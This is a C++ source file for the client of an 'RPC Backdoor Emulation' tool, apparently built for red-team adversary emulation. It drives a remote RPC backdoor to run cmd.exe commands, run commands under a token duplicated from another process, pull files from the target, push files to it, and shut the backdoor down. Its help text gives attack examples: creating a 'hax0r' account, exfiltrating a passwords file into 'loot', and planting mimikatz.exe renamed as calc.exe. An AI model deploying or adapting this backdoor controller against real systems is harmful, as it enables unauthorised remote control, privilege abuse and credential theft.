// File RpcClient.cpp
#include <iostream>
#include <fstream>

#include "../RpcServerInterface/RpcServerInterface.h"
#include "../RpcServer/Base64.h"


void SaveFile(LPSTR path, char* buffer)
{
    // Base64 decode the data
    macaron::Base64 encoder;
    char* decoded;
    int length;
    length = encoder.Decode(buffer, &decoded);

    // Save the data to the specified path
    std::ofstream ofs(path, std::ios::out | std::ios::binary);
    ofs.write(decoded, length);
    ofs.close();
}

static char* ReadFile(LPSTR filename, int* length)
{
    size_t size;

    // Open the file
    std::ifstream ifs(filename, std::ios::in | std::ios::binary | std::ios::ate);
    if (!ifs.is_open())
    {
        *length = -1;
        return NULL;
    }

    // Get the file size
    ifs.seekg(0, std::ios::end);
    size = ifs.tellg();
    ifs.seekg(0, std::ios::beg);
    char* pChars = new char[size];

    // Read all bytes
    ifs.read(pChars, size);

    // Close the file and return the length
    ifs.close();
    *length = size;

    // Base64 encode the content before returning it
    std::string encoded = pChars;
    macaron::Base64 encoder;
    encoded = encoder.Encode(pChars, *length);
    pChars = strdup(encoded.c_str());

    return pChars;
}

void PrintHelp()
{
    printf("RPC Backdoor Emulation\n");
    printf("\n");
    printf("Target information:\n");
    printf("  --protocol\n");
    printf("    Can be 'tcp' for RPC over TCP/IP or 'namedpipe' for RPC over Named Pipes \n");
    printf("  --hostname\n");
    printf("    Specifies the hostname or IP address of the target RPC server\n");
    printf("  --port\n");
    printf("    Specifies the port number of the target RPC server (required for TCP)\n");
    printf("  --pipename\n");
    printf("    Specifies the pipe name of the target RPC server (required for named pipes)\n");
    printf("\n");
    printf("Functions:\n");
    printf("  The function to be executed is passed via the --function argument.\n");
    printf("  The following functions are implemented:\n");
    printf("    * execute\n");
    printf("    * executewithtoken\n");
    printf("    * download\n");
    printf("    * upload\n");
    printf("    * shutdown\n");
    printf("    \n");
    printf("  Execute\n");
    printf("    The execute function executes a command using 'cmd.exe /c ...'.\n");
    printf("    The --command argument is required. If the commands contains any spaces, wrap it in double quotes (\").\n");
    printf("    \n");
    printf("  Execute with token\n");
    printf("    The execute with token function duplicates the token of a given process ID and executes a command using 'cmd.exe /c ...' via the CreateProcessWithTokenW function.\n");
    printf("    The --command argument is required. If the commands contains any spaces, wrap it in double quotes (\").\n");
    printf("    The --pid argument is required. This argument specifies the process ID of which the token will be duplicated. Make sure the RPC server run in a security context with the permissions and privileges required.\n");
    printf("    \n");
    printf("  Download\n");
    printf("    The download function downloads a file from the RPC server and saves it locally. The file is Base64 encoded/decoded in the process.\n");
    printf("    The --remotepath argument specifies the path of the file to be downloaded (used by the server to read the file).\n");
    printf("    The --localpath argument specifies the path of the file to be saved (used by the client to save the file).\n");
    printf("\n");
    printf("  Upload\n");
    printf("    The upload function uploaded a file to the RPC server and saves it remotely. The file is Base64 encoded/decoded in the process.\n");
    printf("    The --remotepath argument specifies the path of the file to be uploaded (used by the server to save the file).\n");
    printf("    The --localpath argument specifies the path of the file to be uploaded (used by the client to read the file).\n");
    printf("    \n");
    printf("  Shutdown\n");
    printf("    The shutdown function instructs the RPC server to terminate the RPC server and exit the thread.\n");
    printf("    \n");
    printf("Examples:\n");
    printf("  Execute a command:\n");
    printf("  RpcClient.exe --protocol namedpipe --hostname 192.168.70.130 --pipename \"\\pipe\\atctl\" --function execute --command \"net user hax0r /add\"\n");
    printf("  \n");
    printf("  Execute a command with the token of a process with the ID 1220:\n");
    printf("  RpcClient.exe --protocol tcp --hostname 192.168.70.130 --port 4747 --function executewithtoken --command \"net user hax0r /add\" --pid 1220\n");
    printf("  \n");
    printf("  Download a file:\n");
    printf("  RpcClient.exe --protocol namedpipe --hostname 192.168.70.130 --pipename \"\\pipe\\atctl\" --function download --localpath \"loot\\passwords.txt\" --remotepath \"secrets\\passwords.txt\"\n");
    printf("  \n");
    printf("  Upload a file:\n");
    printf("  RpcClient.exe --protocol namedpipe --hostname 192.168.70.130 --pipename \"\\pipe\\atctl\" --function upload --localpath \"Tools\\mimikatz.exe\" --remotepath \"calc.exe\"\n");
    printf("");
}

int main(int argc, char** argv)
{
    RPC_STATUS status;
    unsigned char* szStringBinding = NULL;

    char* protocol = NULL;
    char* pipename = NULL;
    char* hostname = NULL;
    char* port = NULL;
    char* function = NULL;
    char* command = NULL;
    char* pid = NULL;
    char* remotepath = NULL;
    char* localpath = NULL;
    char* data = NULL;

    // If not enough arguments are provided, print help and exit
    if (argc < 2)
    {
        PrintHelp();
        exit(0);
    }

    // Parse command line arguments
    for (int i = 1; i < argc; i += 2)
    {
        // Every flag is expected to be followed by a value
        if (i + 1 >= argc) 
        {
            printf("Error: Incorrent number of arguments. See instructions below.\n");
            PrintHelp();
            exit(0);
        }

        // Parse all expected arguments
        if (strcmp("--protocol", argv[i]) == 0)
        {
            protocol = strdup(argv[i + 1]);
        }
        else if (strcmp("--pipename", argv[i]) == 0)
        {
            pipename = strdup(argv[i + 1]);
        }
        else if (strcmp("--hostname", argv[i]) == 0)
        {
            hostname = strdup(argv[i + 1]);
        }
        else if (strcmp("--port", argv[i]) == 0)
        {
            port = strdup(argv[i + 1]);
        }
        else if (strcmp("--function", argv[i]) == 0)
        {
            function = strdup(argv[i + 1]);
        }
        else if (strcmp("--command", argv[i]) == 0)
        {
            command = strdup(argv[i + 1]);
        }
        else if (strcmp("--pid", argv[i]) == 0)
        {
            pid = strdup(argv[i + 1]);
        }
        else if (strcmp("--remotepath", argv[i]) == 0)
        {
            remotepath = strdup(argv[i + 1]);
        }
        else if (strcmp("--localpath", argv[i]) == 0)
        {
            localpath = strdup(argv[i + 1]);
        }
        else if (strcmp("--data", argv[i]) == 0)
        {
            data = strdup(argv[i + 1]);
        }
    }

    // TCP must be accompanied by a hostname and a port
    if (strcmp(protocol, "tcp") == 0)
    {
        if (hostname == NULL || port == NULL) 
        {
            printf("Error: TCP requires providing a hostname/IP address and a port. See instructions below.\n");
            PrintHelp();
            exit(1);
        }
        else
        {
            // Generate string binding for TCP/IP
            status = RpcStringBindingCompose(
                NULL,
                (RPC_CSTR)"ncacn_ip_tcp",
                (RPC_CSTR)hostname,
                (RPC_CSTR)port,
                NULL,
                &szStringBinding);
        }
    }
    // named pipes must be accompanied by a hostname and a pipename
    else if (strcmp(protocol, "namedpipe") == 0)
    {
        if (pipename == NULL || hostname == NULL)
        {
            printf("Error: Named pipe requires providing a hostname and a pipe name. See instructions below.\n");
            PrintHelp();
            exit(1);
        }
        else
        {
            // Generate string binding for named pipes
            status = RpcStringBindingCompose(
                NULL,
                (RPC_CSTR)"ncacn_np",
                (RPC_CSTR)hostname,
                (RPC_CSTR)pipename,
                NULL,
                &szStringBinding);
        }
    }
    if (status)
        exit(status);

    // RPC Binding with the binding string
    status = RpcBindingFromStringBinding( szStringBinding, &hRpcServerInterfaceBinding);

    if (status)
        exit(status);

    RpcTryExcept
    {
        // The execute call must be accompanied by a command
        if (strcmp(function, "execute") == 0)
        {
            if (command == NULL)
            {
                printf("Error: The execute command requires providing a command. See instructions below.\n");
                PrintHelp();
            }
            else
            {
                LPSTR output = 0;
                std::cout << "[+] Sending Execute command: " << command << std::endl;
                Execute(&command, &output);
                std::cout << "[+] Execute command result: " << output << std::endl;
            }
        }
        // The executewithtoken call must be accompanied by a command and a pid
        else if (strcmp(function, "executewithtoken") == 0)
        {
            if (command == NULL || pid == NULL)
            {
                printf("Error: The execute command requires providing a command and a process id (pid). See instructions below.\n");
                PrintHelp();
            }
            else
            {
                LPSTR output = 0;
                std::cout << "[+] Sending Execute command: " << command << std::endl;
                int processId = atoi(pid);
                ExecuteWithToken(&command, processId, &output);
                std::cout << "[+] Execute command result: " << output << std::endl;
            }
        }
        // The download call must be accompanied by a localpath and a remotepath
        else if (strcmp(function, "download") == 0)
        {
            if (localpath == NULL || remotepath == NULL)
            {
                printf("Error: The download command requires providing a remote path (remotepath) for the file to download and a local path (localpath) where the file will be saved. See instructions below.\n");
                PrintHelp();
            }
            else
            {
                LPSTR buffer = 0;
                std::cout << "[+] Sending Download command: " << remotepath << std::endl;
                Download(&remotepath, &buffer);
                std::cout << "[+] Saving to file: " << localpath << "\n";
                SaveFile(localpath, buffer);
            }
        }
        // The upload call must be accompanied by a localpath and a remotepath
        else if (strcmp(function, "upload") == 0)
        {
            if (localpath == NULL || remotepath == NULL)
            {
                printf("Error: The upload command requires providing a local path (localpath) for the file to upload and a remote path (remotepath) where the file will be saved on the remote system. See instructions below.\n");
                PrintHelp();
            }
            else
            {
                int length = -1;
                LPSTR buffer = ReadFile(localpath, &length);
                std::cout << "[+] Sending Upload command: " << remotepath << std::endl;
                Upload(&remotepath, &buffer);
                std::cout << "[+] Upload complete: " << length << " bytes sent" << std::endl;
            }
        }
        // The shutdown call doesn't require any additional arguments
        else if (strcmp(function, "shutdown") == 0)
        {
            Shutdown();
        }
    }
    RpcExcept(1)
    {
        std::cerr << "Runtime reported exception " << RpcExceptionCode() << std::endl;
    }
    RpcEndExcept

    // Free the memory allocated for the string binding
    status = RpcStringFree(&szStringBinding);

    if (status)
        exit(status);

    // Release the binding handle resources and disconnect from the server
    status = RpcBindingFree(&hRpcServerInterfaceBinding);

    if (status)
        exit(status);
}

void* __RPC_USER midl_user_allocate(size_t size)
{
    return malloc(size);
}

void __RPC_USER midl_user_free(void* p)
{
    free(p);
}
